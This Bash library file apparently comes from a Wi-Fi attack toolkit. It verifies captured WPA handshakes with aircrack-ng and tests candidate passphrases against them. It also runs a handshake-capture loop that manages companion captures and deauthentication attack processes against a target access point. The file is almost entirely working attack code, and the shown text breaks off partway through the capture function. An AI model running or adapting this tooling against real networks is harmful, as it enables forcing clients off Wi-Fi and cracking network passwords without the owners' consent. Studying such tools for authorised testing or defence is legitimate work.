#!/usr/bin/env bash

# Copyright 2022 Faither

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights to
# use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
# the Software, and to permit persons to whom the Software is furnished to do so,
# subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
# FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
# COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
# IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

############################################################
# Initials                                                 #
############################################################

#############
# Constants #
#############

declare -r _Lib_handshake=1;
declare -r _Handshake_sourceFilepath="$( readlink -e -- "${BASH_SOURCE[0]:-$0}" 2> '/dev/null'; )";
declare -r _Handshake_sourceDirpath="$( dirname -- "$_Handshake_sourceFilepath" 2> '/dev/null'; )";

[[ ! -f "$_Handshake_sourceFilepath" || ! -d "$_Handshake_sourceDirpath" ]] && exit 199;

# File names

declare -r Handshake_HandshakeFilenamePrefix='handshake';
declare -r Handshake_handshakeInvalidFilenamePrefix='invalid';

# Directory names

declare -r Handshake_handshakesDirname='handshakes';

# Directory paths

declare -r Handshake_HandshakesDirpath="${Environment_workspaceDirpath}/${Handshake_handshakesDirname}";

############################################################
# Functions                                                #
############################################################

Handshake_previewAPDetails()
{
	declare markChar=$'\'';

	if [[ "$1" == '-c' ]];
	then
		markChar="$2";
		shift 2;
	fi

	declare __apBssid="$1";
	declare __apChannel="$2";
	declare __apSsid="$3";

	printf "[ B ${markChar}%s${markChar}, C ${markChar}%s${markChar}, S ${markChar}%s${markChar} ]" \
		"$( [[ "$__apBssid" != '' ]] && printf '%s' "$__apBssid"; )" \
		"$( [[ "$__apChannel" != '' ]] && printf '%s' "$__apChannel"; )" \
		"$( [[ "$__apSsid" != '' ]] && printf '%s' "$__apSsid"; )";
}

Handshake_Psk()
{
	wpa_passphrase "$1" "$2" | head -n 4 | tail -n 1 | sed 's/.*psk=//' | grep -v 'Passphrase must be '
}

############################################################
# Methods                                                  #
############################################################

# Todo: Check if the capture is BSSID filtered since it may result in issues like an aircrack-ng prompt in case of too many APs in the capture
Handshake_Verify()
{
	###########
	# Options #
	###########

	declare args;

	if ! Options args \
		'@1/^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$/' \
		'?!-c;?!-b;?-s;-f;-v' \
		"$@";
	then
		Misc_PrintF -v 1 -t 'f' -nf $'[Handshake_Verify] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
			"$_Options_ResultCode" \
			"$_Options_FailIndex" \
			"$_Options_ErrorMessage" \
			"$( Misc_ArrayJoin -- "$@" )";

		exit 200;
	fi

	declare __captureFilepath="${args[0]}";
	declare __apBssid="${args[1]}";
	declare __apSsid="${args[2]}";
	declare __filter="${args[3]}";
	declare __verbose="${args[4]}";

	########
	# Main #
	########

	if [[ ! "$__apBssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ && ! "$__apSsid" =~ ^.{1,32}$ ]];
	then
		[[ "$__verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Could not verify capture file (invalid BSSID and SSID provided).';

		return 2;
	fi

	if ! Base_FsExists -t f "$__captureFilepath";
	then
		[[ "$__verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Could not verify capture file (no such exists): \'%s\'' -- "$__captureFilepath";

		return 3;
	fi

	declare captureFilepath="$__captureFilepath";

	# If requested to filter
	if [[ "$__filter" != 0 ]];
	then
		declare Handshake_Verify_captureFilepath;

		if ! Capture_Filter -fo Handshake_Verify_captureFilepath -c "$captureFilepath" -b "$__apBssid";
		then
			[[ "$__verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Failed to verify handshake capture file (failed to filter): \'%s\'' -- "$captureFilepath";

			return 4;
		fi

		declare captureFilepath="$Handshake_Verify_captureFilepath";
		[[ "$__verbose" != 0 ]] && Misc_PrintF -v 4 -t 's' -nTf $'Filtered handshake capture file';
	fi

	# Use aircrack-ng to verify the handshake. Timeout is a temporary workaround just in case its prompt when mutliple access points exist in the file
	if ! timeout -s SIGKILL 3 aircrack-ng "$captureFilepath" 2>&1 | grep 'WPA' | grep -i "$__apBssid" | grep "$__apSsid" | grep -qv '(0 handshake)';
	then
		[[ "$__verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'No handshake found for BSSID %s%s: "%s' -- \
			"$__apBssid" "$( [[ "$__apSsid" != '' ]] && printf $' and SSID \'%s\'' "$__apSsid"; )" "$( basename -- "$captureFilepath" 2> '/dev/null'; )";

		return 1;
	fi

	[[ "$__verbose" != 0 ]] && Misc_PrintF -v 4 -t 's' -nmf $'{{@clLightGreen}}Found handshake{{@clDefault}} for BSSID %s%s: \'%s\'' -- \
		"$__apBssid" "$( [[ "$__apSsid" != '' ]] && printf $' and SSID \'%s\'' "$__apSsid"; )" "$( basename -- "$captureFilepath" 2> '/dev/null'; )";

	return 0;
}

Handshake_PskVerify()
{
	###########
	# Options #
	###########

	declare args;

	if ! Options args \
		'?!-f;?!-a;?-o;-v' \
		"$@";
	then
		Misc_PrintF -v 1 -t 'f' -nf $'[Handshake_PskVerify] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
			"$_Options_ResultCode" \
			"$_Options_FailIndex" \
			"$_Options_ErrorMessage" \
			"$( Misc_ArrayJoin -- "$@" )";

		exit 200;
	fi

	declare handshakeFilepath="${args[0]}";
	declare apBssid="${args[1]}";
	declare __outputVariableReferenceName="${args[2]}";
	declare verbose="${args[3]}";
	declare psks=( "${args[@]:4}" );

	if [[ "$__outputVariableReferenceName" != '' ]];
	then
		if [[ "$__outputVariableReferenceName" == 'Handshake_PskVerify_outputVariableReference' ]];
		then
			Misc_PrintF -v 1 -t 'f' -nf $'[Handshake_PskVerify] Output variable reference interference: \'%s\'' -- \
				"$( Misc_ArrayJoin -- "$@" )";

			return 100;
		fi

		declare -n Handshake_PskVerify_outputVariableReference="$__outputVariableReferenceName";
		Handshake_PskVerify_outputVariableReference='';
	fi

	########
	# Main #
	########

	if ! Base_FsExists -t f "$handshakeFilepath";
	then
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Could not verify PSK (no such file exists): \'%s\'' -- "$handshakeFilepath";

		return 2;
	fi

	declare pskTempFilename="psk_temp-$( Misc_RandomString -l 8 )";
	declare pskTempFilepath="${Environment_TempDirpath}/${pskTempFilename}";
	declare pskIndex;

	for (( pskIndex = 0; pskIndex < ${#psks[@]}; pskIndex++ ));
	do
		declare psk="${psks[$pskIndex]}";

		if ! Base_FsWrite -f "$pskTempFilepath" -- "$psk";
		then
			[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nmf $'Could not verify PSK (failed to create temp PSK file): \'%s\'' -- "$pskTempFilepath";

			return 2;
		fi

		declare pskMatch=0;

		if aircrack-ng --bssid "$apBssid" -w "$pskTempFilepath" -- "$handshakeFilepath" | grep -q 'KEY FOUND\! \[';
		then
			declare pskMatch=1;
		fi

		if ! Base_FsDelete -f -- "$pskTempFilepath";
		then
			[[ "$verbose" != 0 ]] && Misc_PrintF -v 3 -t 'w' -nmf $'Failed to remove temp PSK file: \'%s\'' -- "$pskTempFilepath";
		fi

		if [[ "$pskMatch" == 1 ]];
		then
			[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 's' -nmf $'PSK \'{{@clLightGreen}}%s{{@clDefault}}\' (%s) matches handshake: \'%s\'' \
				"$psk" "${#psk}" "$( basename -- "$handshakeFilepath" 2> '/dev/null'; )";

			if [[ "$__outputVariableReferenceName" != '' ]];
			then
				Handshake_PskVerify_outputVariableReference="$psk";
			elif [[ ${#psks[@]} != 1 ]];
			then
				printf '%s' "$psk";
			fi

			return 0;
		fi

		[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'i' -nmf $'PSK \'{{@clLightRed}}%s{{@clDefault}}\' (%s) mismatches handshake: \'%s\'' \
			"$psk" "${#psk}" "$( basename -- "$handshakeFilepath" 2> '/dev/null'; )";
	done

	return 1;
}

Handshake_Exists()
{
	###########
	# Options #
	###########

	declare args;

	if ! Options args \
		'@2/^[a-zA-Z][0-9a-zA-Z]*/' \
		'?!-a;?!-s;?!-o;-v' \
		"$@";
	then
		Misc_PrintF -v 1 -t 'f' -nf $'[Handshake_Exists] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
			"$_Options_ResultCode" "$_Options_FailIndex" "$_Options_ErrorMessage" "$( Misc_ArrayJoin -- "$@" )";

		exit 200;
	fi

	declare apBssid="${args[0]}";
	declare apSsid="${args[1]}";
	declare outputVariableReferenceName="${args[2]}";
	declare verbose="${args[3]}";

	if [[ "$outputVariableReferenceName" != '' ]]
	then
		if [[ "$outputVariableReferenceName" == 'Handshake_Exists_outputVariableReference' ]]
		then
			Misc_PrintF -v 1 -t 'f' -nf $'[Capture_CsvApSelect] Output variable reference interference: \'%s\'' -- "$( Misc_ArrayJoin -- "$@" )";

			return 100;
		fi

		declare -n Handshake_Exists_outputVariableReference="$outputVariableReferenceName";
		Handshake_Exists_outputVariableReference='';
	fi

	########
	# Main #
	########

	Misc_PrintF -v 4 -t 'i' -nf $'Searching for potential handshake files';
	declare apBssidTruncated="$( Misc_EscapeFilename "$apBssid" )";
	declare handshakePotentialFilepaths=();
	declare handshakeInvalidCount=0;
	declare handshakePotentialFilepath;

	# # If no potential handshake found
	if
		! Base_FsExists -t f -- \
			"${Handshake_HandshakesDirpath}/${Handshake_HandshakeFilenamePrefix}"*"${apBssidTruncated:+_}"*"$apBssidTruncated"*;
	then
		Misc_PrintF -v 4 -t 'n' -n -- 'Found 0 potential handshakes';

		return 1;
	fi

	# Each found handshake file (based on filename)
	# for handshakePotentialFilepath in \
		# "${Handshake_HandshakesDirpath}/${Handshake_HandshakeFilenamePrefix}"*"${apBssidTruncated:+_}"*"$apBssidTruncated"*;
	while read handshakePotentialFilepath;
	do
		# If the handshake is valid
		if Handshake_Verify -fc "$handshakePotentialFilepath" -b "$apBssid" -s "$apSsid";
		then
			handshakePotentialFilepaths+=( "$handshakePotentialFilepath" );
		else
			declare handshakeInvalidCount=$(( handshakeInvalidCount + 1 ));

			# Rename the invalid handshake
			Base_FsMove -t 1 "$handshakePotentialFilepath" \
				"$( dirname -- "$handshakePotentialFilepath" 2> '/dev/null'; )/${Handshake_handshakeInvalidFilenamePrefix}_$(
					basename -- "$handshakePotentialFilepath" 2> '/dev/null';
				)";
		fi
	done \
	< <(
		find "${Handshake_HandshakesDirpath}/" -mindepth 1 -maxdepth 1 -type f ! -name '-*' \
			-name "${Handshake_HandshakeFilenamePrefix}*${apBssidTruncated:+_}*${apBssidTruncated}*" -print;
	)

	if [[ "$handshakeInvalidCount" != 0 ]];
	then
		Misc_PrintF -v 3 -t 'w' -nmf $'Found %s potentially {{@clLightRed}}invalid{{@clDefault}} handshake%s. Renamed.' -- \
			"$handshakeInvalidCount" "$( (( handshakeInvalidCount > 1 )) && printf 's'; )";
	fi

	# If didn't found any potential handhshake
	if [[ ${#handshakePotentialFilepaths[@]} == 0 ]];
	then
		Misc_PrintF -v 4 -t 'i' -n -- 'Found 0 potential handshakes';

		return 1;
	fi

	# Found potential handhshake(s)

	# Misc_PrintF -cn;
	Misc_PrintF -v 3 -t 'w' -nmf $'Found {{@clLightCyan}}%s{{@clDefault}} potentially valid handshake%s' -- "${#handshakePotentialFilepaths[@]}" \
		"$( (( ${#handshakePotentialFilepaths[@]} > 1 )) && printf 's:'; )";

	# If found only 1 handshake
	if [[ ${#handshakePotentialFilepaths[@]} == 1 ]];
	then
		Misc_PrintF -v 1 -t 'q' -nmf $'Use "{{@clLightCyan}}%s{{@clDefault}}" handshake file?' -- "$( basename -- "${handshakePotentialFilepaths[0]}" 2> '/dev/null'; )";
		declare Handshake_Exists_prompt;

		if ! Misc_Prompt -o Handshake_Exists_prompt -p '^[YyNn]$' -e '[YyNn]' -d 'y' || [[ ! "$Handshake_Exists_prompt" =~ ^[Yy]$ ]];
		then
			return 2;
		fi

		Handshake_Exists_outputVariableReference="${handshakePotentialFilepaths[0]}";

		return 0;
	fi

	Environment_WindowArrange --bm 'main_twincy_terminal' -- $( Environment_WindowSector -H 6 -V 6 -h 1-4 -v 1-4 -t 0 -r 0 -b 0 -l 0 );
	Misc_PrintF -n;
	declare handshakePotentialFilepathsCountLength="${#handshakePotentialFilepaths[@]}";
	declare handshakePotentialFilepathsCountLength="${#handshakePotentialFilepathsCountLength}";
	declare handshakePotentialFilepathIndex;

	for (( handshakePotentialFilepathIndex = 0; handshakePotentialFilepathIndex < ${#handshakePotentialFilepaths[@]}; handshakePotentialFilepathIndex++ ));
	do
		declare handshakePotentialFilepath="${handshakePotentialFilepaths[$handshakePotentialFilepathIndex]}";

		Misc_PrintF -nmf "    [ %${handshakePotentialFilepathsCountLength}s ] {{@clGray}}(%s){{@clDefault}} '{{@clWhite}}%s{{@clDefault}}'" -- \
			"$(( handshakePotentialFilepathIndex + 1 ))" "$( date '+%F %T' -d "@$( stat -c '%Y' "$handshakePotentialFilepath"; )"; )" \
			"$( basename -- "$handshakePotentialFilepath" 2> '/dev/null'; )";
	done

	Misc_PrintF -n;
	declare Handshake_Exists_prompt; # In case parent subshell/caller has it declared

	while [[ "${Handshake_Exists_prompt+s}" == '' ]];
	do
		# If cancelled
		if ! Misc_Prompt -o Handshake_Exists_prompt -p '^(0|[1-9][0-9]*)$' -e "[1-${#handshakePotentialFilepaths[@]}]";
		then
			return 2;
		fi

		if (( Handshake_Exists_prompt <= 0 || Handshake_Exists_prompt > ${#handshakePotentialFilepaths[@]} ));
		then
			Misc_PrintF -t 'e' -nf 'Index out of range (1-%s)' -- "${#handshakePotentialFilepaths[@]}";
			unset Handshake_Exists_prompt;
			declare Handshake_Exists_prompt;
		fi
	done

	Handshake_Exists_outputVariableReference="${handshakePotentialFilepaths[$(( Handshake_Exists_prompt - 1 ))]}";

	return 0;
}

Handshake_Capture()
{
	###########
	# Options #
	###########

	declare args;

	if ! Options args \
		'@2/^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$/' \
		'@4/^.{1,32}$/' \
		'?!-D;?!-d;?!-a;?-c;?-s;?-o;-f;-v' \
		"$@";
	then
		Misc_PrintF -v 1 -t 'f' -nf $'[Handshake_Capture] Invalid options (code %s, index %s ~ \'%s\'): \'%s\'' -- \
			"$_Options_ResultCode" \
			"$_Options_FailIndex" \
			"$_Options_ErrorMessage" \
			"$( Misc_ArrayJoin -- "$@" )";

		exit 200;
	fi

	declare deviceMain="${args[0]}";
	declare deviceSecondary="${args[1]}";
	declare apTargetBssid="${args[2]}";
	declare apTargetChannel="${args[3]}";
	declare apTargetSsid="${args[4]}";
	declare outputVariableReferenceName="${args[5]}";
	declare captureFilter="${args[6]}";
	declare verbose="${args[7]}";

	if [[ "$outputVariableReferenceName" != '' ]];
	then
		if
			[ "$outputVariableReferenceName" = 'Handshake_Capture_outputVariableReference' ] ||
			[ "$outputVariableReferenceName" = 'Handshake_Capture_outputVariableReferenceBssid' ] ||
			[ "$outputVariableReferenceName" = 'Handshake_Capture_outputVariableReferenceSsid' ] ||
			[ "$outputVariableReferenceName" = 'Handshake_Capture_outputVariableReferenceChannel' ] ||
			[ "$outputVariableReferenceName" = 'Handshake_Capture_outputVariableReferenceTemp' ];
		then
			Misc_PrintF -v 1 -t 'f' -nf $'[Handshake_Capture] Output variable reference interference: \'%s\'' -- \
				"$( Misc_ArrayJoin -- "$@" )";

			return 100;
		fi

		declare -n Handshake_Capture_outputVariableReference="$outputVariableReferenceName";
		declare -n Handshake_Capture_outputVariableReferenceBssid="${outputVariableReferenceName}Bssid";
		declare -n Handshake_Capture_outputVariableReferenceSsid="${outputVariableReferenceName}Ssid";
		declare -n Handshake_Capture_outputVariableReferenceChannel="${outputVariableReferenceName}Channel";
		Handshake_Capture_outputVariableReference='';
		Handshake_Capture_outputVariableReferenceBssid='';
		Handshake_Capture_outputVariableReferenceSsid='';
		Handshake_Capture_outputVariableReferenceChannel='';
	fi

	declare apTargetBssid="${apTargetBssid^^}"; # Capitalize BSSID to match airodump-ng output

	########
	# Main #
	########

	# Set the initial target AP data
	declare apBssid="$apTargetBssid";
	declare apChannel="$apTargetChannel";
	declare apSsid="$apTargetSsid";

	[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'm' -nmTf $'Starting handshake capture %s' -- "$( Handshake_previewAPDetails "$apBssid" "$apChannel" "$apSsid" )";

	# Process metas

	declare processMetaPrefixHandshake='handshake_1';
	declare processMetaGather_1="${processMetaPrefixHandshake}_main_1";
	declare processMetaCompanion_1="${processMetaPrefixHandshake}_companion_1";
	declare processMetaAttackDeauth_1="${processMetaPrefixHandshake}_deauth_1";

	# Window parameters

	declare windowParametersHandshakeCapture="$( Environment_WindowSector -V 2 -v 0 )";
	declare windowParametersHandshakeMain="$( Environment_WindowSector -H 2 -V 2 -h 0 -v 1 -t 0 -r 0 -b 0 -l 0 )";
	declare windowParametersHandshakeAttackDeauth="$( Environment_WindowSector -H 2 -V 4 -h 1 -v 2 )";
	declare windowParametersHandshakeCompanion="$( Environment_WindowSector -H 2 -V 4 -h 1 -v 3 )";

	# Handshake main

	Environment_WindowArrange --bm 'main_twincy_terminal' -- $windowParametersHandshakeMain;

	# Terminate related processes
	Environment_ProcessBindTerminate --bm "$processMetaPrefixHandshake";

	# The handshake variable
	declare handshakeCaptureFilepath;
	unset handshakeCaptureFilepath;
	declare handshakeCaptureFilepath;

	# Temporary
	declare Handshake_Capture_handshakeCaptureTempFilepath;

	# Timeouts (approximate)
	declare captureCycleWaitSeconds=0;
	declare handshakeVerifyRestartTimeout=5; # Check handshake each N seconds
	declare companionFirstCheckTimeout=10; # The timeout before first companion data check after its (re)start
	declare companionRestartTimeout=30; # Restart companion each N seconds
	declare deauthRestartTimeout=60; # Restart deauth each N seconds
	declare apTargetOnlineTimeout=30; # Target AP's maximum offline in N seconds

	# Times
	declare apTargetOnlineTime=-1;
	declare companionStartTime=0;
	declare handshakeVerifyTime=0;
	declare attackDeauthStartTime=0;

	# Counters
	declare handshakeVerifyCount=0;
	declare mainCaptureStartCount=0;
	declare attackDeauthStartCount=0;
	declare companionStartCount=0;
	declare mainCycleCount=0;

	# Deauth
	declare attackDeauthTypes=( 0 1 2 3 - - );

	# Target AP status
	declare apTargetIsActive=0;
	declare apTargetDataStatus=0; # (0 ~ Default, 1 ~ Reset target AP data to initial, 2 ~ Updated AP from companion, 3 ~ Not found or not enough target AP data)

	# While not found a valid handshake
	while [[ "${handshakeCaptureFilepath+s}" == '' ]];
	do
		declare currentTimeSeconds="$( Misc_DateTime -t 3 )";
		[[ "$verbose" != 0 ]] && Misc_PrintF -v 5 -t 'd' -nTf $'Cycle #%s (%s)' -- "$mainCycleCount" "$handshakeVerifyCount";
		declare mainCycleCount="$(( mainCycleCount + 1 ))";

		# If no actual target AP BSSID is availabled after cycle (e.g. a companion did not find)
		if [[ ! "$apBssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]];
		then
			declare apBssid="$apTargetBssid";
			declare apChannel='';
			declare apTargetDataStatus=1; # Set the target AP data status to "set to initial"

			[[ "$verbose" != 0 ]] && Misc_PrintF -v 3 -t 'w' -nmTf $'Trying initial target AP details %s' -- \
				"$( Handshake_previewAPDetails "$apBssid" "$apChannel" )";
		fi

		###################
		# Handshake check #
		###################

		# If the handshake verification timed out, enough AP target data is available, the main capture file is available, and the main capture is active
		if
			(( handshakeVerifyTime + handshakeVerifyRestartTimeout < currentTimeSeconds )) && [[ "$apBssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]] &&
			Base_FsExists -t f -- "${Handshake_Capture_handshakeCaptureTempFilepath}.cap" && Environment_ProcessBindSearch --bm "$processMetaGather_1"
		then
			# If found a valid handshake in the capture file
			if Handshake_Verify -fc "${Handshake_Capture_handshakeCaptureTempFilepath}.cap" -b "$apBssid" -s "$apSsid";
			then
				declare handshakeCaptureFilepath="${Handshake_Capture_handshakeCaptureTempFilepath}.cap";

				break;
			fi

			declare handshakeVerifyCount="$(( handshakeVerifyCount + 1 ))";
			declare handshakeVerifyTime="$( Misc_DateTime -t 3 )";
		fi

		#############
		# Companion #
		#############

		# If the companion capture reached the timeout
		if (( companionStartTime + companionRestartTimeout < currentTimeSeconds ));
		then
			# Terminate current companion capture if exists
			Environment_ProcessBindTerminate --bm "$processMetaCompanion_1";
			declare apTargetOnlineTime=-1;

			# If the start time of the companion capture is already declared (e.g. was started previously)
			# if [[ "$companionStartTime" != 0 ]];
			# then
			# 	declare companionStartCount="$(( companionStartCount + 1 ))";
			# fi

			# declare companionStartTime="$( Misc_DateTime -t 3 )";
		fi

		# If the companion is not running
		if ! Environment_ProcessBindSearch --bm "$processMetaCompanion_1";
		then
			[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nTf $'%starting companion capture%s %s' -- \
				"$( (( companionStartCount > 0 )) && printf 'Res' || printf 'S' )" \
				"$( (( companionStartCount > 0 )) && printf ' (%s total)' "$companionStartCount" )" \
				"$( Handshake_previewAPDetails "$apBssid" "$apChannel" )";

			# If the companion capture filepath is declared (e.g. was started previously)
			if [[ "$Handshake_Capture_companionCaptureBaseFilepath" != '' ]];
			then
				# Delete all files of the previous companion capture if exists
				Base_FsDelete -t 1 -- "$Handshake_Capture_companionCaptureBaseFilepath"*;
			fi

			declare Handshake_Capture_companionCaptureBaseFilepath;

			# Start a companion capture
			if
				! Capture_Start -o Handshake_Capture_companionCaptureBaseFilepath --bm "$processMetaCompanion_1" -x "$windowParametersHandshakeCompanion" \
					-d "$deviceSecondary" -a "$apBssid" -c "$apChannel";
			then
				[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'e' -nTf $'Failed to %sstart companion capture %s' -- \
					"$( (( companionStartCount > 0 )) && printf 're' )" "$( Handshake_previewAPDetails "$apBssid" "$apChannel" )";

				return 1;
			fi

			declare companionStartTime="$( Misc_DateTime -t 3 )";
			declare companionStartCount="$(( companionStartCount + 1 ))";
		fi

		##########################
		# Companion capture data #
		##########################

		# If the companion has been working for at least N seconds and
		# if found an AP with the same SSID in the companion capture file
		if (( companionStartTime + companionFirstCheckTimeout < currentTimeSeconds ));
		then
			# If companion capture gathered handshake
			if
				Base_FsExists -t f -- "${Handshake_Capture_companionCaptureBaseFilepath}.cap" && 
				Handshake_Verify -fc "${Handshake_Capture_companionCaptureBaseFilepath}.cap" -b "$apBssid" -s "$apSsid";
			then
				declare handshakeCaptureFilepath="${Handshake_Capture_companionCaptureBaseFilepath}.cap";

				break;
			fi

			# Reset the companion's AP data
			declare apCompanionBssid='';
			declare apCompanionChannel='';
			declare apCompanionSsid='';
			declare companionApFoundCount=0;
			declare apCompanionApProtectedFoundCount=0;
			declare Handshake_Capture_apData;

			if Capture_CsvApRead -o Handshake_Capture_apData -f "${Handshake_Capture_companionCaptureBaseFilepath}.csv";
			then
				declare apDataIndex;

				# Loop through each AP from the capture file
				for (( apDataIndex = 0; apDataIndex < ${#Handshake_Capture_apData[@]}; apDataIndex++ ));
				do
					declare apCsvBssid="${Handshake_Capture_apData[$apDataIndex]}";
					declare apCsvChannel="${Handshake_Capture_apDataChannels[$apDataIndex]}";
					declare apCsvSsid="${Handshake_Capture_apDataSsids[$apDataIndex]}";
					declare apCsvPrivacy="${Handshake_Capture_apDataPrivacies[$apDataIndex]}";
					declare apCsvStationCount="${Handshake_Capture_apDataStationCounts[$apDataIndex]}";

					# If found a protected station (WPA, WPA2, WPA3...)
					if [[ "$apCsvPrivacy" == *"WPA"* ]];
					then
						# Update the target/relative AP's data
						declare apCompanionBssid="$apCsvBssid";
						declare apCompanionChannel="$apCsvChannel";
						declare apCompanionSsid="$apCsvSsid";
						declare apCompanionApProtectedFoundCount=$(( apCompanionApProtectedFoundCount + 1 ));
					fi
				done

				declare companionApFoundCount="${#Handshake_Capture_apData[@]}";
			else
				[[ "$verbose" != 0 ]] && Misc_PrintF -v 3 -t 'w' -nmTf $'Could not read companion capture file';
			fi

			# If found any related protected AP
			if [[ "$apCompanionApProtectedFoundCount" != 0 ]];
			then
				# Refresh the target AP's presence time
				apTargetOnlineTime="$( Misc_DateTime -t 3 )";

				[[ "$verbose" != 0 ]] && Misc_PrintF -v 5 -t 'd' -nmTf $'Updated target AP online time: %s (%s)' -- \
					"$apTargetOnlineTime" "$( date '+%F_%T' -d "@${apTargetOnlineTime}" )";
			elif [[ "$apTargetOnlineTime" == -1 ]]; # If it's the first companion capture check after a companion restart
			then
				declare apTargetOnlineTime=-2;
				[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'w' -nmTf $'Companion: target AP {{@clRed}}not found{{@clDefault}} (%s total)' -- "$companionApFoundCount";
			fi
		else
			declare apCompanionBssid="$apBssid";
			declare apCompanionChannel="$apChannel";
			declare apCompanionSsid="$apSsid";
		fi

		##############################
		# Access Point's data change #
		##############################

		# If the companion capture data was processed after its start and the companion's AP data mismatches with the target's
		if 
			[[
				"$apTargetOnlineTime" != -1 && (
					"$apCompanionChannel" != "$apChannel" || "$apCompanionBssid" != "$apBssid" || ( "$apCompanionSsid" != '' && "$apCompanionSsid" != "$apSsid" )
				)
			]]
		then
			if [[ "$apCompanionChannel" != '' && "$apCompanionBssid" != '' ]];
			then
				declare apTargetDataStatus=2; # Set the target AP data status to "At least one target AP parameter has changed"

				if [[ "$verbose" != 0 ]];
				then
					declare updatedApData=();
					[[ "$apCompanionBssid" != "$apBssid" ]] && updatedApData+=( "$( printf $'B \'%s\' -> \'%s\'' "$apBssid" "$apCompanionBssid" )" );
					[[ "$apCompanionChannel" != "$apChannel" ]] && updatedApData+=( "$( printf $'C \'%s\' -> \'%s\'' "$apChannel" "$apCompanionChannel" )" );

					[[ "$apCompanionSsid" != '' && "$apCompanionSsid" != "$apSsid" ]] && 
						updatedApData+=( "$( printf $'S \'%s\' -> \'%s\'' "$apSsid" "$apCompanionSsid" )" );

					Misc_PrintF -v 3 -t 'w' -nmTf $'Target AP details {{@clYellow}}updated{{@clDefault}}: %s' -- \
						"$( Misc_ArrayJoin '' '' ', ' "${updatedApData[@]}" )";
				fi
			else
				declare apTargetDataStatus=3; # Set the target AP data status to "Not found/incomplete target AP data"
				declare missingApData=();
				[[ "$apCompanionChannel" == '' ]] && missingApData+=( 'CHA' );
				[[ "$apCompanionBssid" == '' ]] && missingApData+=( 'BSSID' );

				[[ "$__verbose" != 0 ]] && Misc_PrintF -v 4 -t 'w' -nTf $'Companion: Incomplete target AP details. Missing: %s' -- \
					"$( Misc_ArrayJoin -- "${missingApData[@]}" )";
			fi

			# Terminate the current main capture, deauth attack and companion processes if exist in order to restart them with new data
			Environment_ProcessBindTerminate --bm "$processMetaGather_1";
			Environment_ProcessBindTerminate --bm "$processMetaAttackDeauth_1";
			Environment_ProcessBindTerminate --bm "$processMetaCompanion_1";

			# Update the target AP's details according to the companion

			declare apChannel="$apCompanionChannel";
			declare apBssid="$apCompanionBssid";

			if [[ "$apCompanionSsid" != '' ]];
			then
				declare apSsid="$apCompanionSsid";
			fi

			# Sleep each full cycle
			# sleep "$twinTimerTime";

			# Restart the full cycle
			# continue;
		fi

		################################
		# Target Access Point's status #
		################################

		# If the companion data has not been checked after its (re)start, yet
		if [[ "$apTargetOnlineTime" == -1 ]];
		then
			# Sleep each full cycle
			sleep "$captureCycleWaitSeconds";

			continue;
		fi

		# If companion didn't find the target or not found/incomplete target AP data
		if [[ "$apTargetOnlineTime" == -2 || "$apTargetDataStatus" == 3 ]];
		then
			# If the target AP's off-line timeout reached and it is considered currently active
			if (( apTargetOnlineTime + apTargetOnlineTimeout < currentTimeSeconds )) && [[ "$apTargetIsActive" == 1 ]];
			then
				if [[ "$mainCaptureStartCount" != 0 ]];
				then
					[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 'w' -nmTf $'Target AP is probably {{@clRed}}offline{{@clDefault}}';
					Misc_SoundPlay 'ap_lost';
				fi

				declare apTargetIsActive=0;
			fi

			# declare apTargetDataStatus=0;

			# Sleep each full cycle
			sleep "$captureCycleWaitSeconds";

			continue;
		fi

		if [[ "$apTargetIsActive" == 0 ]];
		then
			if [[ "$mainCaptureStartCount" != 0 ]];
			then
				[[ "$verbose" != 0 ]] && Misc_PrintF -v 2 -t 's' -nmTf $'{{@clLightGreen}}Found{{@clDefault}} target AP';
				Misc_SoundPlay 'ap_found';
			fi

			declare apTargetIsActive=1;
		fi

		################
		# Main capture #
		################

		# If target BSSID is available
		if [[ "$apBssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]];
		then
			# If the main capture is not running
			if ! Environment_ProcessBindSearch --bm "$processMetaGather_1";
			then
				[[ "$verbose" != 0 ]] && Misc_PrintF -v 4 -t 'n' -nTf $'%starting main capture%s %s' -- \
					"$( (( mainCaptureStartCount > 0 )) && printf 'Res' || printf 'S' )" \
					"$( (( mainCaptureStartCount > 0 )) && printf ' (%s total)' "$mainCaptureStartCount" )" \
					"$( Handshake_previewAPDetails "$apBssid" "$apChannel" )";

